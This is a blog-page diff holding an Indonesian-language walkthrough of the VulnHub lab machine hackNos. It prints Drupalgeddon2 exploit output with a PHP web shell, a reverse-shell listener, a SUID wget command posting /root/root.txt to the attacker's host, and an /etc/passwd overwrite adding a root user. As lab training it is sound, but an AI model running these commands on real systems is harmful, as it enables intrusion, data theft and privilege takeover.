@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>[VULNHUB] hackNos: Os-hackNos | bl33dz:~#</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="[VULNHUB] hackNos: Os-hackNos" />
+<meta name="author" content="bl33dz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Vulnhub hackNos: Os-hackNos" />
+<meta property="og:description" content="Vulnhub hackNos: Os-hackNos" />
+<link rel="canonical" href="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html" />
+<meta property="og:url" content="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html" />
+<meta property="og:site_name" content="bl33dz:~#" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-12-02T00:00:00+07:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"[VULNHUB] hackNos: Os-hackNos","dateModified":"2019-12-02T00:00:00+07:00","datePublished":"2019-12-02T00:00:00+07:00","url":"http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html"},"author":{"@type":"Person","name":"bl33dz"},"description":"Vulnhub hackNos: Os-hackNos","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/old/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/old/assets/favicon.png" />
+  <link type="application/atom+xml" rel="alternate" href="https://bl33dz.github.io/feed.xml" title="bl33dz:~#" />
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/old/">bl33dz:~#<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://www.facebook.com/bl33dz"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/bl33dz"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+<img src="https://s.gravatar.com/avatar/2c42898e592207a08fefe63c6231c78a?s=256" class="author-avatar" />
+bl33dz<br> ordinary people<br> interested in linux and programming
+
+</div>
+
+<div class="post">
+  <h1 class="post-title">[VULNHUB] hackNos: Os-hackNos</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/old/tag/vulnhub/">vulnhub</a>
+      
+      <a class="tag" href="/old/tag/linux/">linux</a>
+      
+      <a class="tag" href="/old/tag/easy/">easy</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 02 Dec 2019</div>
+  
+  <div class="post-description">Vulnhub hackNos: Os-hackNos</div>
+  
+  <p>My first vulnhub writeup, ya ini adalah writeup vulnhub pertama saya dan juga post pertama di blog ini. Sebenarnya saya sudah menulis beberapa writeup machine hackthebox namun karena machine tersebut belum retired jadi belum saya publish.</p>
+
+<p>Oke, hackNos ini adalah machine yg menggunakan os linux. Untuk info machine ini sendiri bisa diklik link berikut <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">hackNos</a> lalu download file OVA yg tersedia.</p>
+
+<p>Pertama, kita perlu menjalankan machine tersebut dengan VMWare atau VirtualBox dan untuk caranya bisa lihat di link berikut <a href="https://null-byte.wonderhowto.com/how-to/setup-practice-ctfs-from-vulnhub-kali-linux-0170228/">nullbyte</a>. Setelah di run kita perlu mengetahui ip machine tersebut menggunakan command nmap untuk meng-scan range ip tertentu. Karena disini saya menggunakan ip address 192.168.56.xxx maka saya melakukan scanning dengan command <code class="highlighter-rouge">nmap 192.168.56.2-255</code> dan saya mendapatkan ip <code class="highlighter-rouge">192.168.56.101</code>.</p>
+
+<p>Kemudian, paling utama sebelum melakukan pentesting kita perlu tau service apa saja yang tersedia. Kita dapat mengetahui service service yang menggunakan nmap.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnhub/hackNos# nmap -sV -sC -sT 192.168.56.101
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-02 05:43 WIB
+Nmap scan report for 192.168.56.101
+Host is up (0.00048s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)
+|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)
+|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 08:00:27:70:EB:6C (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds
+</code></pre></div></div>
+<p>Dari result diatas kita mendapatkan 2 port yaitu port ssh dan port http. Kita akan membuka port http lebih dulu karena biasanya vulnerability-nya terdapat pada web aplikasi machine tersebut. Dan mendapatkan tampilan web seperti dibawah ini.</p>
+
+<p><img src="/assets/images/vulnhub-1.png" alt="vulnhub-1.png" /></p>
+
+<p>Hal yang langsung ada dipikiran saya yaitu brute force directory. Disini saya akan menggunakan <code class="highlighter-rouge">ffuf</code> untuk melakukan brute forcing.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnhub/hackNos# ffuf -w /root/htb/dir-small.txt -u http://192.168.56.101/FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v0.12
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.56.101/FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+drupal                  [Status: 301, Size: 317, Words: 20, Lines: 10]
+</code></pre></div></div>
+<p>Disini saya mendapatkan directory <code class="highlighter-rouge">drupal</code> dan ketika saya lihat view-source dari website tersebut saya mendapati bahwa versi drupal tersebut adalah Drupal 7.</p>
+
+<p><img src="/assets/images/vulnhub-2.png" alt="vulnhub-2.png" /></p>
+
+<p>Nah setelah tahu website tersebut menggunakan Drupal versi 7 saya mencoba mencari cari exploit. Setelah beberapa <del>tahun</del> kali mencoba berbagai exploit saya menemukan salah satu exploit yang work (<a href="https://github.com/dreadlocked/Drupalgeddon2/blob/master/drupalgeddon2.rb">Exploit</a>). Langsung saja saya meng-run exploit tersebut dan mendapatkan shell.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnhub/hackNos# ruby drupalgeddon2.rb http://192.168.56.101/drupal/
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://192.168.56.101/drupal/
+--------------------------------------------------------------------------------
+[+] Found  : http://192.168.56.101/drupal/CHANGELOG.txt    (HTTP Response: 200)
+[+] Drupal!: v7.57
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/password)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Clean URLs
+[!] Result : Clean URLs disabled (HTTP Response: 404)
+[i] Isn't an issue for Drupal v7.x
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo VKFGMJXS
+[+] Result : VKFGMJXS
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://192.168.56.101/drupal/shell.php)
+[!] Response: HTTP 200 // Size: 5.   ***Something could already be there?***
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : &lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&gt;&amp;1' ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl 'http://192.168.56.101/drupal/shell.php' -d 'c=hostname'
+hackNos&gt;&gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div></div>
+<p>Singkat cerita saya mendapatkan interactive shell (<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell</a>). Lalu saya mencoba masuk ke directory <code class="highlighter-rouge">/home</code> dan menemukan user <code class="highlighter-rouge">james</code>. Ketika saya melihat lihat isi folder user <code class="highlighter-rouge">james</code> ternyata file <code class="highlighter-rouge">user.txt</code> readable.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnhub/hackNos# nc -vlp 1337
+listening on [any] 1337 ...
+192.168.56.101: inverse host lookup failed: Unknown host
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 41176
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@hackNos:/var/www/html/drupal$ cd /home
+cd /home
+www-data@hackNos:/home$ ls -la
+ls -la
+total 12
+drwxr-xr-x  3 root  root  4096 Oct 31 17:23 .
+drwxr-xr-x 22 root  root  4096 Oct 31 17:20 ..
+drwxr-xr-x  3 james james 4096 Nov 16 21:28 james
+www-data@hackNos:/home$ cd james
+cd james
+www-data@hackNos:/home/james$ ls -la
+ls -la
+total 40
+drwxr-xr-x 3 james james 4096 Nov 16 21:28 .
+drwxr-xr-x 3 root  root  4096 Oct 31 17:23 ..
+-rw------- 1 james james 2609 Nov 16 21:34 .bash_history
+-rw-r--r-- 1 james james  220 Oct 31 17:23 .bash_logout
+-rw-r--r-- 1 james james 3771 Oct 31 17:23 .bashrc
+drwx------ 2 james james 4096 Oct 31 17:24 .cache
+-rw------- 1 root  root   127 Oct 31 17:41 .mysql_history
+-rw-r--r-- 1 james james  655 Oct 31 17:23 .profile
+-rw-r--r-- 1 james james    0 Oct 31 17:24 .sudo_as_admin_successful
+-rw-rw-r-- 1 james james  175 Oct 31 17:59 .wget-hsts
+-rw-r--r-- 1 root  root   357 Nov 16 21:28 user.txt
+www-data@hackNos:/home/james$ cat user.txt
+cat user.txt
+   _                                  
+  | |                                 
+ / __) ______  _   _  ___   ___  _ __ 
+ \__ \|______|| | | |/ __| / _ \| '__|
+ (   /        | |_| |\__ \|  __/| |   
+  |_|          \__,_||___/ \___||_|   
+                                      
+                                      
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+www-data@hackNos:/home/james$
+</code></pre></div></div>
+<p>Sampai sini kita telah mendapatkan flag user yaitu <code class="highlighter-rouge">bae11ce4f67af91fa58576c1da2aad4b</code>. Lalu saya mencoba mendapatkan privesc untuk melihat flag root. Pertama, saya melakukan enumerating menggunakan <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a>.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 506200 May  9  2018 /usr/bin/wget
+</code></pre></div></div>
+<p>Hasil dari enumeration menggunakan <code class="highlighter-rouge">LinEnum.sh</code> saya mendapatkan sesuatu yang menarik yaitu command <code class="highlighter-rouge">wget</code> yang ternyata adalah SUID files. Setelah mencari referensi di google saya mencoba melihat file <code class="highlighter-rouge">/root/root.txt</code> menggunakan <code class="highlighter-rouge">wget</code>. <em>Loh kok tau nama filenya?</em>. Nebak aja, insting seorang dukun karena biasanya root flag letaknya disitu.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#### TARGET ####
+www-data@hackNos:/tmp$ cat /root/root.txt
+cat: /root/root.txt: Permission denied
+www-data@hackNos:/tmp$ wget --post-file=/root/root.txt 192.168.56.1
+--2019-12-02 05:09:08--  http://192.168.56.1/
+Connecting to 192.168.56.1:80... connected.
+HTTP request sent, awaiting response...
+
+#### ATTACKER ####
+root@kali:~/vulnhub/hackNos# nc -vlp 80
+listening on [any] 80 ...
+192.168.56.101: inverse host lookup failed: Unknown host
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 32920
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 192.168.56.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 491
+
+    _  _                              _   
+  _| || |_                           | |  
+ |_  __  _|______  _ __  ___    ___  | |_ 
+  _| || |_|______|| '__|/ _ \  / _ \ | __|
+ |_  __  _|       | |  | (_) || (_) || |_ 
+   |_||_|         |_|   \___/  \___/  \__|
+                                          
+                                          
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+Author : Rahul Gehlaut
+
+Linkedin : https://www.linkedin.com/in/rahulgehlaut/
+
+Blog : www.hackNos.com
+</code></pre></div></div>
+<p>Dan file <code class="highlighter-rouge">/root/root.txt</code> akan dikirim menggunakan wget ke listener saya. Root flag: <code class="highlighter-rouge">bae11ce4f67af91fa58576c1da2aad4b</code>. Sebenarnya ada cara lain juga untuk mendapatkan user root. Berikut adalah langkah langkah untuk cara lainnya.</p>
+
+<p>Pertama, copy dulu semua isi <code class="highlighter-rouge">/etc/passwd</code> target ke local kita. Setelah itu kita generate password hash dengan command <code class="highlighter-rouge">openssl passwd -1 -salt ruut pwnd</code> dan mendapatkan output <code class="highlighter-rouge">$1$ruut$MOyAqyAAB6KZwan9qiHaO0</code>. Lalu kita susun menjadi sebuah line seperti berikut.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruut:$1$ruut$MOyAqyAAB6KZwan9qiHaO0:0:0:root:/root:/bin/bash
+</code></pre></div></div>
+<p>Baru kita masukkan line tersebut ke file <code class="highlighter-rouge">passwd</code> yang telah kita copy ke local kita. Lalu jalankan <code class="highlighter-rouge">python -m SimpleHTTPServer</code> pada local kita. Jika sudah kita hanya perlu meng-overwrite <code class="highlighter-rouge">/etc/passwd</code> target dengan file yang kita buat.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hackNos:/tmp$ wget http://192.168.56.1:8000/passwd -O /etc/passwd
+--2019-12-02 05:31:27--  http://192.168.56.1:8000/passwd
+Connecting to 192.168.56.1:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1681 (1.6K) [application/octet-stream]
+Saving to: '/etc/passwd'
+
+/etc/passwd         100%[===================&gt;]   1.64K  --.-KB/s    in 0s      
+
+2019-12-02 05:31:27 (138 MB/s) - '/etc/passwd' saved [1681/1681]
+
+www-data@hackNos:/tmp$ su ruut                                            
+Password: pwnd
+root@hackNos:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+<p>Login pada user <code class="highlighter-rouge">ruut</code> menggunakan password <code class="highlighter-rouge">pwnd</code> seperti yang kita generate menggunakan command <code class="highlighter-rouge">openssl</code> tadi dan kita akan mendapat user root.</p>
+
+<p>Nah selesai sudah machine ini dan tunggu next writeup di blog ini.</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/old/2020/05/20/vulnhub-typo1.html">
+            [VULNHUB] Typo: 1
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/old/2020/05/05/hackthebox-bitlab.html">
+            [HTB] Bitlab
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/old/2020/05/04/web-joints.html">
+            [JOINTS2020] Writeup Category Web
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/old/tag/ctf/" class="set-1">ctf</a> <a href="/old/tag/easy/" class="set-1">easy</a> <a href="/old/tag/hackthebox/" class="set-2">hackthebox</a> <a href="/old/tag/linux/" class="set-5">linux</a> <a href="/old/tag/medium/" class="set-4">medium</a> <a href="/old/tag/rce/" class="set-1">rce</a> <a href="/old/tag/vulnhub/" class="set-2">vulnhub</a> <a href="/old/tag/web/" class="set-1">web</a> <a href="/old/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+  	<center><a href="https://www.hackthebox.eu/home/users/profile/67190"><img src="https://www.hackthebox.eu/badge/image/67190" alt="Hack The Box"></a></center><br><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === 'undefined') {
+   theme = "dark";
+}
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+} else {
+    document.documentElement.setAttribute('data-theme', 'light');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
